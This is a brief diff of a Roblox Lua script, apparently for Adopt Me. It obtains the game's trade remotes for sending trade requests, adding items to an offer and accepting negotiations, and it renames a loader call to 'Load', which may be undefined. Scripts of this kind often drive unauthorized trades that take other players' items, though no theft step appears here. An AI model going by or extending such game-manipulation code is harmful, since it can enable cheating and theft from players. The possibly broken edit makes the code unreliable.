@@ -47,7 +47,7 @@ end
 
 local HttpService = game:GetService("HttpService")
 local Loads = require(game.ReplicatedStorage.Fsys).load
-local RouterClient = Loads("RouterClient")
+local RouterClient = Load("RouterClient")
 local SendTrade = RouterClient.get("TradeAPI/SendTradeRequest")
 local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
 local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
